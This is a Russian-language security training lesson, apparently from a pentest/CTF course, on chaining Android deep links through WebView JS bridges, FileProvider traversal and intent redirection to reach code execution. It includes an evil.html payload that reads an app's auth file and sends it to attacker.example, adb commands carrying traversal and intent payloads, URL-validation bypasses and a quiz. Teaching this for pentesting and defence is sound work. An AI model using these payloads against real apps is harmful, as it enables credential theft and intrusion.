---
id: mobile-deeplink-rce
title: "Deep link → RCE: цепочки от ссылки до выполнения кода"
category: mobile
parent: mobile-exploit-chains
difficulty: expert
order: 2
tags: [deeplink, rce, webview, file-provider, intent, chain, android, exploit]
prerequisites: [mobile-deeplink-deep, mobile-webview-deep]
useful_for:
  - "Пентест мобильных приложений"
  - "Bug bounty (критичные цепочки)"
  - "CTF Mobile"
estimated_minutes: 50
summary: "Как deep link превращается в RCE: цепочки через WebView, file/content-URI, intent redirection и нативные мосты; полный разбор с командами и демонстрацией."
---
## Введение

Deep link сам по себе редко даёт RCE, но в цепочке с WebView, file-провайдерами и intent redirection он становится точкой входа для выполнения кода. Классические цепочки: deep link → `loadUrl` недоверенного URL → WebView с `addJavascriptInterface` → вызов нативных методов; или deep link → `file://`/`content://` → чтение/запись произвольных файлов; или deep link → intent redirection → запуск приватного компонента с привилегиями. Этот урок — про сборку таких цепочек и доказательство.

Требуется понимание `mobile-deeplink-deep` (ATO-цепочки) и `mobile-webview-deep` (WebView). Здесь — фокус на RCE-примитивах.

## Входы (sources)

```bash
# deep links и их параметры
grep -rn "android:scheme\|android:host\|<data" src/AndroidManifest.xml
# exported activity с обработкой url
grep -rn "getIntent().getData\|Uri.parse\|getQueryParameter" src/smali*/ | head
```

Типичные входы: `myapp://open?url=...`, `myapp://webview?target=...`, App Links (`https://app.target.com/open`), QR/уведомления.

## Передаточные звенья (gadgets)

- **WebView redirect**: `WebViewClient.shouldOverrideUrlLoading` возвращает `false` для внешних URL → загрузка attacker-страницы.
- **`loadUrl` с недоверенными данными**: deep link-параметр попадает в `loadUrl` без валидации.
- **`file://` / `content://`**: доступ к локальным файлам, `setAllowFileAccess(true)`.
- **Intent redirection**: вложенный Intent из deep link-параметра.
- **FileProvider**: `content://<pkg>.fileprovider/` с неограниченным `path`.

## Sinks (RCE/данные)

- **JS-bridge** (`@JavascriptInterface`) — вызов нативных методов из JS.
- **`WebViewClient` + `addJavascriptInterface`** с опасными методами (файлы, exec).
- **Нативные библиотеки** с командными операциями.
- **Файловые операции** (запись в конфиг, `Runtime.exec`).

## Полный сквозной пример: deep link → WebView → JS-bridge → RCE

Дано: `myapp://webview?url=` открывает WebView с `addJavascriptInterface`.

```bash
# 1. Разведка deep link
grep -rn "myapp" src/AndroidManifest.xml
# -> <data android:scheme="myapp" android:host="webview"/>
# 2. Проверяем загрузку внешнего URL
adb shell am start -a android.intent.action.VIEW -d "myapp://webview?url=https://attacker.example/evil.html"
# 3. На attacker-странице вызываем bridge
```

`evil.html`:

```html
<script>
  // если bridge экспонирован как 'native'
  var r = native.readFile("/data/data/com.target.app/shared_prefs/auth.xml");
  fetch("https://attacker.example/?d=" + encodeURIComponent(r));
</script>
```

Если bridge позволяет выполнять команды/файловые операции — это RCE. Frida-хук для подтверждения bridge:

```javascript
Java.perform(function() {
  var WV = Java.use("android.webkit.WebView");
  WV.addJavascriptInterface.implementation = function(obj, name) {
    console.log("[bridge] name=" + name + " class=" + obj.getClass().getName());
    return this.addJavascriptInterface(obj, name);
  };
});
```

## Цепочка через file:// / content://

```bash
# deep link открывает локальный файл
adb shell am start -a android.intent.action.VIEW -d "myapp://open?path=file:///data/data/com.target.app/shared_prefs/auth.xml"
# или через content-провайдер
adb shell am start -a android.intent.action.VIEW -d "myapp://open?path=content://com.target.app.fileprovider/../../../../data/data/com.target.app/databases/app.db"
```

Если приложение грузит этот файл в WebView (`loadUrl("file://...")`) — возможен доступ к приватным данным, а при записи — подмена конфигов.

## Цепочка через intent redirection

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "myapp://open?next=intent:#Intent;component=com.target.app/.PrivateExportService;end"
```

Если приложение берёт `next` из deep link и запускает — redirection (см. `mobile-intent-redirection`).

## Методика

1. Перечислите все входы (deep links, App Links, exported-компоненты).
2. Для каждого проследите данные до sink (WebView, bridge, файлы, Intent).
3. Постройте PoC: `adb am start` с параметрами либо HTML-страница.
4. Докажите влияние (чтение файла, RCE, ATO) и зафиксируйте шаги.

## Частые ошибки

- **Тест только явного deep link**: App Links и неявные схемы тоже входы.
- **Не проверить WebView-настройки**: `setJavaScriptEnabled`, `setAllowFileAccess`, `addJavascriptInterface`.
- **Игнорировать FileProvider path**: неограниченный `path` — traversal.
- **Забыть про intent redirection**: deep link-параметр как вложенный Intent.
- **Не доказать влияние**: цепочка без результата — не находка.
- **Только статика**: динамика (Frida/adb) подтверждает достижимость.

## Что дальше / решение

Соберите цепочку от входа к sink и докажите. Свяжите с `mobile-webview-jsbridge` (bridge abuse), `mobile-deeplink-deep` (ATO), `mobile-intent-redirection`. Рекомендация в отчёте: валидировать URL (whitelist), отключать небезопасные WebView-настройки, ограничивать FileProvider и не доверять deep link-параметрам.

## Справочная таблица

| Вход | Gadget | Sink |
|------|--------|------|
| myapp://webview?url= | loadUrl | JS-bridge |
| myapp://open?path= | file:// | WebView/файл |
| myapp://open?next= | intent redirect | приватный компонент |
| App Link | shouldOverrideUrlLoading | внешний контент |

| Проверка | Команда |
|----------|---------|
| Deep links | grep манифеста |
| Запуск | `adb am start -a VIEW -d` |
| Bridge | Frida addJavascriptInterface |
| Навигация | Burp/логи WebView |

## Сквозной кейс: от App Link до чтения приватного файла

Разберём цепочку целиком. Дано: приложение поддерживает App Link `https://app.target.com/open?file=`, экспортированную activity и WebView.

Шаг первый — разведка входов. Смотрим манифест: находим `intent-filter` с `android:autoVerify="true"` и `<data android:host="app.target.com">`. Значит, ссылка открывает activity. Параметр `file` попадает в код. Ищем его обработку: `getQueryParameter("file")` → `Uri.parse` → `loadUrl`. Это gadget.

Шаг второй — sink. В декомпилированном коде находим `loadUrl` с `setAllowFileAccess(true)`. Если параметр `file` не валидируется, можно загрузить `file:///data/data/com.target.app/...`. Но напрямую приватный путь недоступен из WebView чужого приложения — нужен обход через FileProvider.

Шаг третий — FileProvider. В манифесте находим `<provider android:name="androidx.core.content.FileProvider">` с `<root-path>` или широким `<paths>`. Если `path="."` или нет ограничений — traversal возможен. Формируем URI:

```
content://com.target.app.fileprovider/root/../../data/data/com.target.app/shared_prefs/auth.xml
```

Шаг четвертый — доставка. App Link `https://app.target.com/open?file=content://...` открывает WebView, который грузит файл. Если WebView выводит содержимое или передаёт его в мост — утечка.

Шаг пятый — подтверждение. Запускаем:

```bash
adb shell am start -a android.intent.action.VIEW \
  -d "https://app.target.com/open?file=content://com.target.app.fileprovider/root/../../data/data/com.target.app/shared_prefs/auth.xml"
```

Наблюдаем содержимое prefs. Цепочка подтверждена.

## Варианты sink для RCE

Если WebView имеет мост с `readFile`/`exec`, traversal ведёт к RCE. Если есть `addJavascriptInterface`, внешняя страница вызывает нативные методы. Если deep link-параметр попадает в `Runtime.exec` или в нативный вызов — прямая команда. Всегда ищите путь от входа к нативному sink.

## Обход валидации URL

Частые обходы: `https://app.target.com.attacker.example/` (suffix), `https://app.target.com@attacker/` (userinfo), `https://attacker/?x=app.target.com` (contains), редирект с доверенного домена. Правильная проверка — парсинг и сверка `getHost()` по whitelist.

## Методический чек-лист

Перечислить входы (deep links, App Links, exported), для каждого проследить данные до sink (WebView, bridge, файлы, Intent, exec), построить PoC, подтвердить влияние, оформить. Проверять WebView-настройки, FileProvider paths, intent redirection, нативные мосты.

## Рекомендации в отчёте

Валидировать URL строго, не грузить `file://` из внешних параметров, ограничить FileProvider путями, отключить `setAllowFileAccess`, не экспонировать опасные методы моста, дублировать проверки на сервере. Цепочка deep link → RCE устраняется разрывом хотя бы одного звена — обычно валидацией URL и минимизацией моста.

## Разбор через drozer и автоматизация

Для цепочек удобно начать с `drozer`, который покажет все входы и их intent-filters. Команда `run app.activity.info -a <pkg>` даёт список activity с `exported` и `permission`, `run app.package.attacksurface` — сводку. Далее для каждого входа проверяем, как обрабатывается URL/extra: ищите `getIntent().getData()`, `getQueryParameter`, `getParcelableExtra` в декомпилированном коде. Комбинируя drozer (карта) и jadx (код), вы быстро находите пары «вход → sink».

Автоматизация PoC: соберите скрипт, который перебирает входы и запускает их через `adb am start` с payload-ами, собирая результат в лог. Для каждого входа фиксируйте, открылся ли WebView, вызвался ли мост, прочитался ли файл. Так цепочки находятся системно, а не наугад.

## Важные детали

Проверяйте не только явные deep links, но и App Links (`autoVerify`), а также неявные intent-filters, делающие activity доступной. Учитывайте, что часть входов требует определённых extras, категорий или данных для достижения кода. В отчёте для каждой цепочки указывайте полный путь: вход, звенья, sink, влияние, шаги воспроизведения.

## Фаззинг deep link-параметров

Deep links — удобный вход для автоматического перебора параметров. Соберите список параметров (`url`, `target`, `next`, `file`, `path`, `redirect`, `token`) и payload-ов (внешний URL, `file://`, `content://`, `javascript:`, `intent:`). Прогоняйте через `adb am start -a android.intent.action.VIEW -d "<scheme>://<host>?<param>=<payload>"`, наблюдая logcat и сеть.

Ищите: загрузку внешнего URL в WebView, запуск вложенного Intent, чтение файла, вызов моста. Каждый результат фиксируйте с точной командой. Для App Links используйте `https://` вместо схемы.

## Проверка редиректов

Если приложение грузит URL с доверенного домена, но тот имеет open redirect, можно уйти на attacker-страницу. Проверяйте цепочку: deep link → доверенный URL → редирект → внешний контент → sink. Это классическая многошаговая цепочка.

## Итог

Deep link-RCE находится фаззингом параметров и анализом обработки URL. Ключ — найти, где недоверенный параметр достигает WebView/файла/Intent без валидации. В отчёте покажите полную цепочку и рекомендации: whitelist URL, запрет `file://`, ограничение FileProvider, минимизация моста.

## Итоговый чек-лист deep link-RCE

1. Соберите все входы: deep links, App Links, exported-компоненты, intent extras.
2. Для каждого проследите данные до sink: WebView, JS-bridge, файловые операции, Intent, exec.
3. Проверьте настройки WebView (`setJavaScriptEnabled`, `setAllowFileAccess`, `setAllowUniversalAccessFromFileURLs`).
4. Проверьте FileProvider paths и intent redirection.
5. Постройте PoC и подтвердите влияние (чтение файла, RCE, ATO).
6. Оформите с полным путём цепочки и рекомендациями.

Помните: разрыв любого звена (валидация URL, отключение файлового доступа, минимизация моста) обезвреживает цепочку. В отчёте укажите самое дешёвое исправление.

## Квиз

```quiz
- question: "Что чаще всего служит sink для RCE в deep link-цепочке?"
  options:
    - "WebView JS-bridge (addJavascriptInterface)"
    - "Manifest"
    - "CA-сертификат"
    - "Wi-Fi настройки"
  answer: 0
- question: "Какая WebView-настройка открывает доступ к локальным файлам?"
  options:
    - "setAllowFileAccess(true)"
    - "setJavaScriptEnabled(false)"
    - "setBlockNetworkLoads(true)"
    - "setSupportZoom(false)"
  answer: 0
- question: "Как запустить deep link из adb?"
  options:
    - "am start -a android.intent.action.VIEW -d <uri>"
    - "pm path"
    - "content query"
    - "fastboot flash"
  answer: 0
- question: "Почему FileProvider с неограниченным path опасен?"
  options:
    - "Позволяет path traversal к приватным файлам"
    - "Ускоряет приложение"
    - "Снимает подпись"
    - "Отключает TLS"
  answer: 0
- question: "Чем подтверждают достижимость цепочки?"
  options:
    - "Динамикой (adb/Frida) и PoC с результатом"
    - "Только статикой"
    - "Только обфускацией"
    - "Только подписью"
  answer: 0
```

## Где пригодится

- **Пентест:** критические цепочки RCE.
- **Bug bounty:** из «medium» в critical.
- **Анализ малвари:** понимание атак.
- **CTF:** Mobile-задачи на RCE.
